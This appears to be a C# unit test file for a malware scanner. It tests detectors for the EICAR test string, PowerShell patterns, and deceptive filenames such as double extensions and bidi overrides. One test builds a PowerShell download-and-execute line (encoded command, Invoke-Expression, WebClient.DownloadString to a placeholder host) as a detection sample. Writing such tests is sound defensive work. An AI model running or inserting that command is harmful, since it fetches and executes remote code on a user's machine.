using System.Text;
using Lumen.Core.Detection;
using Lumen.Core.Models;
using Lumen.Core.Scanning;

namespace Lumen.Core.Tests;

public sealed class DetectionTests
{
    [Fact]
    public void Eicar_detector_finds_test_string_at_start_and_mid_file()
    {
        var detector = new EicarTestDetector();
        var eicar = TestData.EicarBytes();

        var atStart = detector.Inspect(FileProbe.FromBytes("sample.com", eicar), CancellationToken.None).ToArray();
        var padded = Encoding.ASCII.GetBytes("harmless prefix\n").Concat(eicar).ToArray();
        var atOffset = detector.Inspect(FileProbe.FromBytes("sample.com", padded), CancellationToken.None).ToArray();

        Assert.Single(atStart);
        Assert.Equal("test.eicar", atStart[0].RuleId);
        Assert.Equal(FindingCategory.TestSignature, atStart[0].Category);
        Assert.Equal(Confidence.Definitive, atStart[0].Confidence);
        Assert.Single(atOffset);
    }

    [Fact]
    public void Eicar_detector_ignores_benign_content()
    {
        var detector = new EicarTestDetector();
        var findings = detector.Inspect(FileProbe.FromText("notes.txt", "just a harmless text file"), CancellationToken.None);
        Assert.Empty(findings);
    }

    [Fact]
    public void Script_detector_flags_documented_token_combination()
    {
        var detector = new ScriptPatternDetector();
        var sample = string.Concat(
            "powershell.exe -", "EncodedCommand AAAA ",
            "Invoke-", "Expression (New-Object Net.WebClient).Download", "String('https://example.invalid')");

        var findings = detector.Inspect(FileProbe.FromText("sample.ps1", sample), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.download-execute");
        Assert.Contains(findings, finding => finding.RuleId == "script.encoded-command");
        Assert.All(findings, finding => Assert.Equal(FindingCategory.Heuristic, finding.Category));
    }

    [Fact]
    public void Script_detector_ignores_benign_script()
    {
        var detector = new ScriptPatternDetector();
        var findings = detector.Inspect(
            FileProbe.FromText("maintenance.ps1", "Write-Output 'hello'; Get-ChildItem -Path C:\\Temp"),
            CancellationToken.None);
        Assert.Empty(findings);
    }

    [Fact]
    public void Script_detector_only_applies_to_script_like_extensions()
    {
        var detector = new ScriptPatternDetector();
        var sample = "powershell -EncodedCommand AAAA";
        Assert.Empty(detector.Inspect(FileProbe.FromText("image.jpg", sample), CancellationToken.None));
        Assert.NotEmpty(detector.Inspect(FileProbe.FromText("notes.txt", sample), CancellationToken.None));
    }

    [Fact]
    public void Script_detector_ignores_binary_content()
    {
        var detector = new ScriptPatternDetector();
        var binary = new byte[512];
        binary[0] = 0x00;
        binary[10] = 0x01;
        var probe = FileProbe.FromBytes("sample.ps1", binary);
        Assert.False(probe.LooksTextual);
        Assert.Empty(detector.Inspect(probe, CancellationToken.None));
    }

    [Fact]
    public void Filename_detector_flags_double_extension()
    {
        var detector = new FilenameHeuristicDetector();
        var findings = detector.Inspect(FileProbe.FromText("invoice.pdf.exe", "x"), CancellationToken.None).ToArray();
        Assert.Single(findings);
        Assert.Equal("name.double-extension", findings[0].RuleId);
    }

    [Fact]
    public void Filename_detector_ignores_normal_names()
    {
        var detector = new FilenameHeuristicDetector();
        Assert.Empty(detector.Inspect(FileProbe.FromText("invoice.pdf", "x"), CancellationToken.None));
        Assert.Empty(detector.Inspect(FileProbe.FromText("setup.exe", "x"), CancellationToken.None));
    }

    [Fact]
    public void Filename_detector_flags_bidi_override()
    {
        var detector = new FilenameHeuristicDetector();
        var name = "invoice\u202Eexe.txt";
        Assert.Contains(
            detector.Inspect(FileProbe.FromText(name, "x"), CancellationToken.None),
            finding => finding.RuleId == "name.bidi-override");
    }

    [Fact]
    public void Registry_deduplicates_findings_by_rule_id()
    {
        var registry = new DetectorRegistry(
        [
            new DuplicateDetector("same.rule"),
            new DuplicateDetector("same.rule")
        ]);

        Assert.Single(registry.Inspect(FileProbe.FromText("a.txt", "x"), CancellationToken.None));
    }

    [Fact]
    public void Catalog_documents_every_default_rule_family()
    {
        Assert.Contains(DetectionCatalog.Rules, rule => rule.Id == "test.eicar");
        Assert.Contains(DetectionCatalog.Rules, rule => rule.Id == "script.download-execute");
        Assert.Contains(DetectionCatalog.Rules, rule => rule.Id == "name.double-extension");
        Assert.All(DetectionCatalog.Rules, rule => Assert.False(string.IsNullOrWhiteSpace(rule.Description)));
    }

    [Fact]
    public void Registry_cancellation_is_observed()
    {
        using var cts = new CancellationTokenSource();
        cts.Cancel();
        var registry = DetectorRegistry.CreateDefault();
        Assert.Throws<OperationCanceledException>(() =>
            registry.Inspect(FileProbe.FromText("x.txt", "x"), cts.Token));
    }

    private sealed class DuplicateDetector(string id) : Abstractions.IScanDetector
    {
        public string Id => id;
        public string Name => "duplicate";
        public string Description => "duplicate";
        public FindingCategory Category => FindingCategory.Heuristic;
        public Confidence Confidence => Confidence.Low;

        public IEnumerable<Finding> Inspect(FileProbe probe, CancellationToken cancellationToken) =>
        [
            new Finding
            {
                RuleId = id,
                Title = "duplicate",
                Category = Category,
                Confidence = Confidence,
                Summary = "duplicate",
                Detail = "duplicate",
                Advice = "duplicate"
            }
        ];
    }
}
